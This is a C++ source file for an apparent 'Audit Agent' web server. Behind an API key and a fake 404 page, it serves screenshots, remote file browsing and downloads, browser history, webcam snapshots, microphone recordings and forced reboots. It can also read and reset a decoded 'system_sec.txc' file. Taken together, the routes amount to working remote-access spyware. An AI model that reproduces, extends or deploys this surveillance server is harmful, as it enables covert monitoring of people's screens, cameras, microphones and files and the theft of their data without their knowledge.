#include "AuditWebServer.h"

#include "AuditAgentUI.h"
#include "ScreenCapture.h"
#include "ZipBuilder.h"
#include "BrowserHistory.h"
#include "WebcamCapture.h"
#include "AudioCapture.h"
#include "HostControl.h"
#include "SystemSecFile.h"
#include "ApiKeyManager.h"

#include <iostream>
#include <string>
#include <sstream>
#include <iomanip>
#include <utility>
#include <fstream>
#include <algorithm>
#include <cstdlib>
#include <cctype>

static bool EndsWith(const std::string& value, const std::string& suffix) {
    if (suffix.size() > value.size()) {
        return false;
    }

    return std::equal(
        suffix.rbegin(),
        suffix.rend(),
        value.rbegin()
    );
}

AuditWebServer::AuditWebServer(
    std::string host,
    int port,
    std::string allowedRoot
)
    : host_(std::move(host)),
    port_(port),
    running_(false),
    fileBrowser_(std::move(allowedRoot)) {
    RegisterRoutes();
}

bool AuditWebServer::Start() {
    running_ = true;
    return server_.listen(host_, port_);
}

void AuditWebServer::Stop() {
    running_ = false;
    server_.stop();
}

bool AuditWebServer::ParseJsonBody(const httplib::Request& req, Json::Value& root, std::string& error) {
    error.clear();

    Json::CharReaderBuilder builder;
    std::string errs;

    std::istringstream input(req.body);

    if (!Json::parseFromStream(builder, input, &root, &errs)) {
        error = "Invalid JSON body.";
        return false;
    }

    return true;
}

bool AuditWebServer::IsAuthorized(const httplib::Request& req) const {
    Json::Value root;
    std::string error;

    if (!ParseJsonBody(req, root, error)) {
        return false;
    }

    if (!root.isMember("api_key") || !root["api_key"].isString()) {
        return false;
    }

    return ApiKeyManager::ValidateApiKey(root["api_key"].asString());
}

std::string AuditWebServer::LoginHtml() {
    return R"HTML(
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Audit Agent Login</title>
<link rel="icon" type="image/svg+xml" href='data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"%3E%3Crect width="64" height="64" rx="14" fill="%230f172a"/%3E%3Cpath d="M32 8 52 16v14c0 13-8.5 22.5-20 26C20.5 52.5 12 43 12 30V16l20-8z" fill="%230ea5e9"/%3E%3Cpath d="M24 31.5 29.5 37 42 23.5" fill="none" stroke="white" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/%3E%3C/svg%3E'>

<style>
* {
    box-sizing: border-box;
}

html,
body {
    margin: 0;
    padding: 0;
    width: 100%;
    min-width: 0;
    height: 100%;
}

body {
    background: #0f1117;
    color: #e8e8e8;
    font-family: Arial, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
}

.login-box {
    width: 470px;
    max-width: calc(100vw - 56px);
    background: #171b28;
    border: 1px solid #2c3142;
    border-radius: 16px;
    padding: 24px;
    box-shadow: 0 18px 50px rgba(0, 0, 0, 0.35);
}

h1 {
    font-size: 22px;
    margin: 0 0 18px 0;
    font-weight: 700;
    line-height: 1.2;
}

.form-stack {
    width: 100%;
    display: flex;
    flex-direction: column;
    gap: 12px;
}

input {
    display: block;
    width: 100%;
    max-width: 100%;
    min-width: 0;
    height: 40px;
    padding: 0 12px;
    border-radius: 8px;
    border: 1px solid #3a4054;
    background: #0c0e14;
    color: #eee;
    font-size: 14px;
    outline: none;
}

input:focus {
    border-color: #2d7dff;
}

button {
    display: block;
    width: 100%;
    max-width: 100%;
    min-width: 0;
    height: 40px;
    padding: 0 12px;
    border: 0;
    border-radius: 8px;
    background: #2d7dff;
    color: white;
    cursor: pointer;
    font-size: 14px;
    font-weight: 600;
}

button:hover {
    background: #1e68d7;
}

.status {
    margin-top: 14px;
    font-size: 13px;
    color: #aab2c8;
    min-height: 18px;
    overflow-wrap: anywhere;
}
</style>
</head>

<body>
<div class="login-box">
    <h1>Audit Agent</h1>

    <div class="form-stack">
        <input id="apiKey" type="password" placeholder="API key" autocomplete="off">
        <button onclick="login()">Open Dashboard</button>
    </div>

    <div class="status" id="status">Enter API key.</div>
</div>

<script>
async function login() {
    const key = document.getElementById("apiKey").value;
    const status = document.getElementById("status");

    if (!key) {
        status.textContent = "Missing API key.";
        return;
    }

    status.textContent = "Loading dashboard...";

    try {
        const res = await fetch("/ui", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                api_key: key
            })
        });

        if (!res.ok) {
            status.textContent = "Invalid key or dashboard unavailable.";
            return;
        }

        const html = await res.text();

        sessionStorage.setItem("auditagent_api_key", key);

        document.open();
        document.write(html);
        document.close();
    } catch (e) {
        status.textContent = "Login failed: " + e;
    }
}

document.getElementById("apiKey").addEventListener("keydown", function(e) {
    if (e.key === "Enter") {
        login();
    }
});
</script>
</body>
</html>
)HTML";
}

std::string AuditWebServer::JsonEscape(const std::string& value) {
    std::ostringstream out;

    for (char c : value) {
        switch (c) {
        case '\\':
            out << "\\\\";
            break;
        case '"':
            out << "\\\"";
            break;
        case '\n':
            out << "\\n";
            break;
        case '\r':
            out << "\\r";
            break;
        case '\t':
            out << "\\t";
            break;
        default:
            if (static_cast<unsigned char>(c) < 0x20) {
                out << "\\u"
                    << std::hex
                    << std::setw(4)
                    << std::setfill('0')
                    << static_cast<int>(static_cast<unsigned char>(c));
            }
            else {
                out << c;
            }
            break;
        }
    }

    return out.str();
}

std::string AuditWebServer::MimeTypeForPath(const std::string& path) {
    std::string lower = path;

    std::transform(lower.begin(), lower.end(), lower.begin(), [](unsigned char c) {
        return static_cast<char>(std::tolower(c));
        });

    if (EndsWith(lower, ".txt")) return "text/plain";
    if (EndsWith(lower, ".log")) return "text/plain";
    if (EndsWith(lower, ".csv")) return "text/csv";
    if (EndsWith(lower, ".json")) return "application/json";
    if (EndsWith(lower, ".xml")) return "application/xml";
    if (EndsWith(lower, ".html")) return "text/html";
    if (EndsWith(lower, ".css")) return "text/css";
    if (EndsWith(lower, ".js")) return "application/javascript";
    if (EndsWith(lower, ".png")) return "image/png";
    if (EndsWith(lower, ".jpg")) return "image/jpeg";
    if (EndsWith(lower, ".jpeg")) return "image/jpeg";
    if (EndsWith(lower, ".gif")) return "image/gif";
    if (EndsWith(lower, ".bmp")) return "image/bmp";
    if (EndsWith(lower, ".webp")) return "image/webp";
    if (EndsWith(lower, ".mp4")) return "video/mp4";
    if (EndsWith(lower, ".webm")) return "video/webm";
    if (EndsWith(lower, ".ogg")) return "video/ogg";

    return "application/octet-stream";
}

std::string AuditWebServer::FileNameFromPath(const std::string& path) {
    size_t pos = path.find_last_of("\\/");

    if (pos == std::string::npos) {
        return path;
    }

    return path.substr(pos + 1);
}

bool AuditWebServer::ReadFileBytes(const std::string& path, std::vector<unsigned char>& data) {
    data.clear();

    std::ifstream file(path, std::ios::binary);

    if (!file.is_open()) {
        return false;
    }

    file.seekg(0, std::ios::end);
    std::streampos size = file.tellg();

    if (size < 0) {
        return false;
    }

    file.seekg(0, std::ios::beg);

    data.resize(static_cast<size_t>(size));

    if (!data.empty()) {
        file.read(reinterpret_cast<char*>(data.data()), size);
    }

    return true;
}

std::vector<std::string> AuditWebServer::ExtractJsonStringArray(const Json::Value& root, const std::string& key) {
    std::vector<std::string> values;

    if (!root.isMember(key) || !root[key].isArray()) {
        return values;
    }

    for (const auto& item : root[key]) {
        if (item.isString()) {
            values.push_back(item.asString());
        }
    }

    return values;
}

void AuditWebServer::RegisterRoutes() {
    server_.Get("/", [](const httplib::Request& req, httplib::Response& res) {
        res.status = 404;
        res.set_content("Not Found\n", "text/plain");
        });

    server_.Get("/login", [](const httplib::Request& req, httplib::Response& res) {
        res.set_content(LoginHtml(), "text/html");
        });

    server_.Post("/ui", [this](const httplib::Request& req, httplib::Response& res) {
        if (!IsAuthorized(req)) {
            res.status = 404;
            res.set_content("Not Found\n", "text/plain");
            return;
        }

        res.set_content(AuditAgentUI::DashboardHtml(), "text/html");
        });

    server_.Post("/api/health", [this](const httplib::Request& req, httplib::Response& res) {
        if (!IsAuthorized(req)) {
            res.status = 401;
            res.set_content("Unauthorized\n", "text/plain");
            return;
        }

        res.set_content("AuditAgent OK\n", "text/plain");
        });

    server_.Post("/api/screenshot", [this](const httplib::Request& req, httplib::Response& res) {
        if (!IsAuthorized(req)) {
            res.status = 401;
            res.set_content("Unauthorized\n", "text/plain");
            return;
        }

        std::vector<unsigned char> bmp = ScreenCapture::CaptureScreenBmp();

        if (bmp.empty()) {
            res.status = 500;
            res.set_content("Unable to capture screen\n", "text/plain");
            return;
        }

        res.set_content(
            reinterpret_cast<const char*>(bmp.data()),
            bmp.size(),
            "image/bmp"
        );
        });

    server_.Post("/api/files/list", [this](const httplib::Request& req, httplib::Response& res) {
        if (!IsAuthorized(req)) {
            res.status = 401;
            res.set_content("Unauthorized\n", "text/plain");
            return;
        }

        Json::Value root;
        std::string parseError;

        if (!ParseJsonBody(req, root, parseError)) {
            res.status = 400;
            res.set_content("{\"ok\":false,\"error\":\"Invalid JSON body.\"}", "application/json");
            return;
        }

        std::string path = fileBrowser_.GetAllowedRoot();

        if (root.isMember("path") && root["path"].isString()) {
            path = root["path"].asString();
        }

        std::vector<FileEntry> entries;
        std::string resolvedPath;
        std::string error;

        if (!fileBrowser_.ListDirectory(path, entries, resolvedPath, error)) {
            res.status = 400;
            res.set_content(
                "{\"ok\":false,\"error\":\"" + JsonEscape(error) + "\"}",
                "application/json"
            );
            return;
        }

        std::string json;
        json += "{";
        json += "\"ok\":true,";
        json += "\"path\":\"" + JsonEscape(resolvedPath) + "\",";
        json += "\"entries\":[";

        for (size_t i = 0; i < entries.size(); ++i) {
            const auto& e = entries[i];

            if (i > 0) {
                json += ",";
            }

            json += "{";
            json += "\"name\":\"" + JsonEscape(e.name) + "\",";
            json += "\"path\":\"" + JsonEscape(e.path) + "\",";
            json += "\"type\":\"" + std::string(e.isDirectory ? "directory" : "file") + "\",";
            json += "\"size\":" + std::to_string(e.size);
            json += "}";
        }

        json += "]";
        json += "}";

        res.set_content(json, "application/json");
        });

    server_.Post("/api/files/download", [this](const httplib::Request& req, httplib::Response& res) {
        if (!IsAuthorized(req)) {
            res.status = 401;
            res.set_content("Unauthorized\n", "text/plain");
            return;
        }

        Json::Value root;
        std::string parseError;

        if (!ParseJsonBody(req, root, parseError)) {
            res.status = 400;
            res.set_content("Invalid JSON body\n", "text/plain");
            return;
        }

        if (!root.isMember("path") || !root["path"].isString()) {
            res.status = 400;
            res.set_content("Missing path\n", "text/plain");
            return;
        }

        std::string requestedPath = root["path"].asString();
        std::string resolvedPath;
        std::string error;

        if (!fileBrowser_.IsRegularFile(requestedPath, resolvedPath, error)) {
            res.status = 400;
            res.set_content(error + "\n", "text/plain");
            return;
        }

        std::vector<unsigned char> data;

        if (!ReadFileBytes(resolvedPath, data)) {
            res.status = 500;
            res.set_content("Unable to read file\n", "text/plain");
            return;
        }

        std::string fileName = FileNameFromPath(resolvedPath);

        res.set_header(
            "Content-Disposition",
            "attachment; filename=\"" + fileName + "\""
        );

        res.set_content(
            reinterpret_cast<const char*>(data.data()),
            data.size(),
            MimeTypeForPath(resolvedPath)
        );
        });

    server_.Post("/api/files/download-zip", [this](const httplib::Request& req, httplib::Response& res) {
        if (!IsAuthorized(req)) {
            res.status = 401;
            res.set_content("Unauthorized\n", "text/plain");
            return;
        }

        Json::Value root;
        std::string parseError;

        if (!ParseJsonBody(req, root, parseError)) {
            res.status = 400;
            res.set_content("Invalid JSON body\n", "text/plain");
            return;
        }

        std::vector<std::string> paths = ExtractJsonStringArray(root, "paths");

        if (paths.empty()) {
            res.status = 400;
            res.set_content("No files selected\n", "text/plain");
            return;
        }

        std::vector<ZipFileItem> items;

        for (const auto& requestedPath : paths) {
            std::string resolvedPath;
            std::string error;

            if (!fileBrowser_.IsRegularFile(requestedPath, resolvedPath, error)) {
                continue;
            }

            std::vector<unsigned char> data;

            if (!ReadFileBytes(resolvedPath, data)) {
                continue;
            }

            ZipFileItem item;
            item.archiveName = FileNameFromPath(resolvedPath);
            item.data = std::move(data);

            items.push_back(std::move(item));
        }

        if (items.empty()) {
            res.status = 400;
            res.set_content("No valid files to zip\n", "text/plain");
            return;
        }

        std::vector<unsigned char> zip = ZipBuilder::BuildZip(items);

        res.set_header(
            "Content-Disposition",
            "attachment; filename=\"selected_files.zip\""
        );

        res.set_content(
            reinterpret_cast<const char*>(zip.data()),
            zip.size(),
            "application/zip"
        );
        });

    server_.Post("/api/browser/available", [this](const httplib::Request& req, httplib::Response& res) {
        if (!IsAuthorized(req)) {
            res.status = 401;
            res.set_content("Unauthorized\n", "text/plain");
            return;
        }

        auto browsers = BrowserHistory::GetAvailableBrowsers();

        std::string json;
        json += "{\"ok\":true,\"browsers\":[";

        for (size_t i = 0; i < browsers.size(); ++i) {
            const auto& b = browsers[i];

            if (i > 0) {
                json += ",";
            }

            json += "{";
            json += "\"id\":\"" + JsonEscape(b.id) + "\",";
            json += "\"name\":\"" + JsonEscape(b.name) + "\",";
            json += "\"available\":" + std::string(b.available ? "true" : "false");
            json += "}";
        }

        json += "]}";

        res.set_content(json, "application/json");
        });

    server_.Post("/api/browser/history", [this](const httplib::Request& req, httplib::Response& res) {
        if (!IsAuthorized(req)) {
            res.status = 401;
            res.set_content("Unauthorized\n", "text/plain");
            return;
        }

        Json::Value root;
        std::string parseError;

        if (!ParseJsonBody(req, root, parseError)) {
            res.status = 400;
            res.set_content("{\"ok\":false,\"error\":\"Invalid JSON body.\"}", "application/json");
            return;
        }

        if (!root.isMember("browser") || !root["browser"].isString()) {
            res.status = 400;
            res.set_content("{\"ok\":false,\"error\":\"Missing browser.\"}", "application/json");
            return;
        }

        std::string browser = root["browser"].asString();

        std::vector<BrowserHistoryEntry> entries;
        std::string error;

        if (!BrowserHistory::ReadHistory(browser, entries, error, 300)) {
            res.status = 500;
            res.set_content(
                "{\"ok\":false,\"error\":\"" + JsonEscape(error) + "\"}",
                "application/json"
            );
            return;
        }

        std::string json;
        json += "{\"ok\":true,\"entries\":[";

        for (size_t i = 0; i < entries.size(); ++i) {
            const auto& e = entries[i];

            if (i > 0) {
                json += ",";
            }

            json += "{";
            json += "\"browser\":\"" + JsonEscape(e.browser) + "\",";
            json += "\"title\":\"" + JsonEscape(e.title) + "\",";
            json += "\"url\":\"" + JsonEscape(e.url) + "\",";
            json += "\"time\":\"" + JsonEscape(e.lastVisitTime) + "\",";
            json += "\"visit_count\":" + std::to_string(e.visitCount);
            json += "}";
        }

        json += "]}";

        res.set_content(json, "application/json");
        });

    server_.Post("/api/webcam/frame", [this](const httplib::Request& req, httplib::Response& res) {
        if (!IsAuthorized(req)) {
            res.status = 401;
            res.set_content("Unauthorized\n", "text/plain");
            return;
        }

        Json::Value root;
        std::string parseError;

        if (!ParseJsonBody(req, root, parseError)) {
            res.status = 400;
            res.set_content("Invalid JSON body\n", "text/plain");
            return;
        }

        int cameraIndex = 0;

        if (root.isMember("camera") && root["camera"].isInt()) {
            cameraIndex = root["camera"].asInt();
        }

        std::vector<unsigned char> jpeg;
        std::string error;

        if (!WebcamCapture::CaptureJpeg(jpeg, error, cameraIndex)) {
            res.status = 500;
            res.set_content(error + "\n", "text/plain");
            return;
        }

        res.set_content(
            reinterpret_cast<const char*>(jpeg.data()),
            jpeg.size(),
            "image/jpeg"
        );
        });

    server_.Post("/api/audio/capture", [this](const httplib::Request& req, httplib::Response& res) {
        if (!IsAuthorized(req)) {
            res.status = 401;
            res.set_content("Unauthorized\n", "text/plain");
            return;
        }

        Json::Value root;
        std::string parseError;

        if (!ParseJsonBody(req, root, parseError)) {
            res.status = 400;
            res.set_content("Invalid JSON body\n", "text/plain");
            return;
        }

        int seconds = 3;

        if (root.isMember("seconds") && root["seconds"].isInt()) {
            seconds = root["seconds"].asInt();
        }

        if (seconds < 1) seconds = 1;
        if (seconds > 30) seconds = 30;

        std::vector<unsigned char> wav;
        std::string error;

        if (!AudioCapture::CaptureWav(wav, error, seconds)) {
            res.status = 500;
            res.set_content(error + "\n", "text/plain");
            return;
        }

        res.set_header("Content-Disposition", "inline; filename=\"audio_capture.wav\"");

        res.set_content(
            reinterpret_cast<const char*>(wav.data()),
            wav.size(),
            "audio/wav"
        );
        });

    server_.Post("/api/host/reboot", [this](const httplib::Request& req, httplib::Response& res) {
        if (!IsAuthorized(req)) {
            res.status = 401;
            res.set_content("Unauthorized\n", "text/plain");
            return;
        }

        std::string error;

        if (!HostControl::ForceReboot(error)) {
            res.status = 500;
            res.set_content(error + "\n", "text/plain");
            return;
        }

        res.set_content("Host reboot command sent.\n", "text/plain");
        });

    server_.Post("/api/system-sec/read", [this](const httplib::Request& req, httplib::Response& res) {
        if (!IsAuthorized(req)) {
            res.status = 401;
            res.set_content("Unauthorized\n", "text/plain");
            return;
        }

        std::string decodedText;
        std::string error;

        if (!SystemSecFile::ReadDecoded(decodedText, error)) {
            res.status = 500;
            res.set_content(
                "{\"ok\":false,\"error\":\"" + JsonEscape(error) + "\"}",
                "application/json"
            );
            return;
        }

        std::string json;
        json += "{";
        json += "\"ok\":true,";
        json += "\"content\":\"" + JsonEscape(decodedText) + "\"";
        json += "}";

        res.set_content(json, "application/json");
        });

    server_.Post("/api/system-sec/reset", [this](const httplib::Request& req, httplib::Response& res) {
        if (!IsAuthorized(req)) {
            res.status = 401;
            res.set_content("Unauthorized\n", "text/plain");
            return;
        }

        std::string error;

        if (!SystemSecFile::Reset(error)) {
            res.status = 500;
            res.set_content(
                "{\"ok\":false,\"error\":\"" + JsonEscape(error) + "\"}",
                "application/json"
            );
            return;
        }

        res.set_content(
            "{\"ok\":true,\"message\":\"system_sec.txc reset successfully.\"}",
            "application/json"
        );
        });
}